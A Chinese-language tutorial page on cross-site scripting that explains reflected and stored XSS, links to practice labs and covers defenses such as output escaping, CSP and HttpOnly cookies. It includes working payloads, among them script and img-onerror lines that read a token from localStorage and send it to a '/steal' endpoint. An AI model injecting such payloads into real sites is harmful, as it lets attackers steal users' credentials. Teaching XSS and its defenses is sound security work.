# XSS 跨站脚本攻击

## 什么是 XSS？

XSS (Cross-Site Scripting) 是一种代码注入攻击。攻击者通过在网页中注入恶意脚本，当其他用户浏览该页面时，脚本会在用户浏览器中执行。

## 攻击类型

### 反射型 XSS

恶意脚本来自当前 HTTP 请求，不存储在服务器。

```
/search?q=<script>alert('XSS')</script>
```

**攻击流程：**
1. 攻击者构造包含恶意脚本的 URL
2. 诱导用户点击该链接
3. 服务器将恶意脚本"反射"回页面
4. 浏览器执行恶意脚本

### 存储型 XSS

恶意脚本被存储在服务器，所有访问者都会中招。

```html
<!-- 评论内容 -->
<script>fetch('/steal?token='+localStorage.token)</script>
```

**攻击流程：**
1. 攻击者提交包含恶意脚本的内容
2. 服务器存储到数据库
3. 其他用户访问页面时加载恶意脚本
4. 脚本在所有用户浏览器中执行

### Token 窃取

XSS 最危险的利用方式之一：

```html
<img src=x onerror="fetch('/api/steal?token='+localStorage.getItem('token'))">
```

## 实验演示

访问 [XSS 实验](/labs/xss) 进行实践：

1. **反射型 XSS** - 搜索功能注入
2. **存储型 XSS** - 评论系统注入
3. **Token 窃取** - 窃取用户凭证

## 防御方法

### 1. 输出转义

```javascript
function escapeHtml(str) {
  return str
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#039;')
}
```

### 2. 避免 innerHTML

```javascript
// ❌ 危险
element.innerHTML = userInput

// ✅ 安全
element.textContent = userInput
```

### 3. CSP 策略

```
Content-Security-Policy: script-src 'self'
```

### 4. HttpOnly Cookie

```javascript
res.cookie('token', jwt, {
  httpOnly: true,  // JS 无法读取
  secure: true,
  sameSite: 'strict'
})
```

## 测试 Payload

```html
<script>alert('XSS')</script>
<img src=x onerror="alert('XSS')">
<svg onload="alert('XSS')">
<div onmouseover="alert('XSS')">hover me</div>
```
